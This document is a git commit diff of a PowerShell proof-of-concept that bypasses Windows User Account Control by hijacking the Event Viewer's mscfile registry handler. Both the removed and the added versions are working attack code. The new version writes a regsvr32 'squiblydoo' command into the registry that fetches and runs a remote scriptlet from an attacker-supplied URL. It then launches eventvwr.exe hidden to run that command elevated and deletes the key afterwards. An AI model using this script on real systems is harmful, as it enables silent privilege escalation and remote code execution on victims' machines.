d4b22c06bbe395f606e65ff42fcd30197f86b357
gushmazuko <34921843+gushmazuko@users.noreply.github.com>
2018-04-13 00:07:37 +0200

    New EventVwrBypass For Win7

--- EventVwrBypass.ps1
+++ EventVwrBypass.ps1
@@ -1,110 +1,53 @@
-function EventVwrBypass {
 <#
 .SYNOPSIS
-
-Bypasses UAC by performing an image hijack on the .msc file extension
-Expected to work on Win7, 8.1 and Win10
-
-Only tested on Windows 7 and Windows 10
-
-Author: Matt Nelson (@enigma0x3)
-License: BSD 3-Clause
-Required Dependencies: None
-Optional Dependencies: None
-
-.PARAMETER Command
-
- Specifies the command you want to run in a high-integrity context. For example, you can pass it powershell.exe followed by any encoded command "powershell -enc <encodedCommand>"
-
+	This script is a proof of concept to bypass the User Access Control (UAC) via Via Eventvwr Registry Key.
+	This will bypass Windows UAC by hijacking a special key in the Registry under the current user hive,
+	and inserting a custom command that will get invoked when the Windows Event Viewer is launched.
+	Work on Windows 7 and 8.1
+.NOTES
+	Function   : EventVwrBypass
+	File Name  : EventVwrBypass.ps1
+	Author     : Gushmazuko
+	Research   : Matt Nelson - UAC bypass discovery and research
+.LINK
+	https://github.com/gushmazuko/WinBypass/blob/master/EventVwrBypass.ps1
+	Original source: https://github.com/enigma0x3/Misc-PowerShell-Stuff/blob/master/Invoke-EventVwrBypass.ps1
 .EXAMPLE
-
-EventVwrBypass -http "http:\\192.168.0.10\runner.sct"
-
-This will write out "Is Elevated: True" to C:\UACBypassTest.
-
+	Load "regsvr32 -s -n -u -i:http://192.168.0.10/runner.cst scrobj.dll" (By Default used 'arch 64'):
+	EventVwrBypass -http "http://192.168.0.10/runner.cst" -arch 64
 #>
 
-    [CmdletBinding(SupportsShouldProcess = $True, ConfirmImpact = 'Medium')]
-    Param (
-        [Parameter(Mandatory = $True)]
-        [ValidateNotNullOrEmpty()]
-        [String]
-        $http,
+function EventVwrBypass(){
+	Param (
 
-        [Switch]
-        $Force
-    )
-    $ConsentPrompt = (Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System).ConsentPromptBehaviorAdmin
-    $SecureDesktopPrompt = (Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System).PromptOnSecureDesktop
+		[Parameter(Mandatory=$True)]
+		[String]$http,
+		[ValidateSet(64,86)]
+		[int]$arch = 64
+	)
 
-    if(($(whoami /groups) -like "*S-1-5-32-544*").length -eq 0) {
-        "[!] Current user not a local administrator!"
-        Throw ("Current user not a local administrator!")
-    }
-    if (($(whoami /groups) -like "*S-1-16-8192*").length -eq 0) {
-        "[!] Not in a medium integrity process!"
-        Throw ("Not in a medium integrity process!")
-    }
+	$program = "regsvr32 -s -n -u -i:$http scrobj.dll"
 
-    if($ConsentPrompt -Eq 2 -And $SecureDesktopPrompt -Eq 1){
-        "UAC is set to 'Always Notify'. This module does not bypass this setting."
-        exit
-    }
-    else{
-        #Begin Execution
+	#Create registry structure
+	New-Item "HKCU:\Software\Classes\mscfile\shell\open\command" -Force
+	Set-ItemProperty -Path "HKCU:\Software\Classes\mscfile\shell\open\command" -Name "(default)" -Value $program -Force
 
-        #Store the payload (due to eventvwr.exe length restrictions)
-        $RegPath = 'HKCU:Software\Microsoft\Windows\Update'
-        $parts = $RegPath.split('\');
-        $path = $RegPath.split("\")[0..($parts.count -2)] -join '\';
-        $name = $parts[-1];
-        $null = Set-ItemProperty -Force -Path $path -Name $name -Value $http;
+	#Perform the bypass
+	switch($arch)
+	{
+		64
+		{
+			#x64 shell in Windows x64 | x86 shell in Windows x86
+			Start-Process "C:\Windows\System32\eventvwr.exe" -Window Hidden
+		}
+		86
+		{
+			#x86 shell in Windows x64
+			C:\Windows\Sysnative\cmd.exe /c "powershell Start-Process C:\Windows\System32\slui.exe -Window Hidden"
+		}
+	}
 
-        $mscCommandPath = "HKCU:\Software\Classes\mscfile\shell\open\command"
-        $launcherCommand = $pshome + '\' + 'powershell.exe -Nop -NonI -c $x=$((gp HKCU:Software\Microsoft\Windows Update).Update); powershell -Nop -NonI -W Hidden -C regsvr32 -s -n -u -i:$x scrobj.dll'
-        #Add in the new registry entries to hijack the msc file
-        if ($Force -or ((Get-ItemProperty -Path $mscCommandPath -Name '(default)' -ErrorAction SilentlyContinue) -eq $null)){
-            New-Item $mscCommandPath -Force |
-                New-ItemProperty -Name '(Default)' -Value $launcherCommand -PropertyType string -Force | Out-Null
-        }else{
-            Write-Warning "Key already exists, consider using -Force"
-            exit
-        }
-
-        if (Test-Path $mscCommandPath) {
-            Write-Verbose "Created registry entries to hijack the msc extension"
-        }else{
-            Write-Warning "Failed to create registry key, exiting"
-            exit
-        }
-
-        $EventvwrPath = Join-Path -Path ([Environment]::GetFolderPath('System')) -ChildPath 'eventvwr.exe'
-        #Start Event Viewer
-        if ($PSCmdlet.ShouldProcess($EventvwrPath, 'Start process')) {
-            $Process = Start-Process -FilePath $EventvwrPath -PassThru
-            Write-Verbose "Started eventvwr.exe"
-        }
-
-        #Sleep 5 seconds 
-        Write-Verbose "Sleeping 5 seconds to trigger payload"
-        if (-not $PSBoundParameters['WhatIf']) {
-            Start-Sleep -Seconds 5
-        }
-
-        $mscfilePath = 'HKCU:\Software\Classes\mscfile'
-        $PayloadPath = 'HKCU:Software\Microsoft\Windows'
-        $PayloadKey = "Update"
-
-        if (Test-Path $mscfilePath) {
-            #Remove the registry entry
-            Remove-Item $mscfilePath -Recurse -Force
-            Remove-ItemProperty -Force -Path $PayloadPath -Name $PayloadKey
-            Write-Verbose "Removed registry entries"
-        }
-
-        if(Get-Process -Id $Process.Id -ErrorAction SilentlyContinue){
-            Stop-Process -Id $Process.Id
-            Write-Verbose "Killed running eventvwr process"
-        }
-    }
+	#Remove registry structure
+	Start-Sleep 3
+	Remove-Item "HKCU:\Software\Classes\mscfile" -Recurse -Force
 }
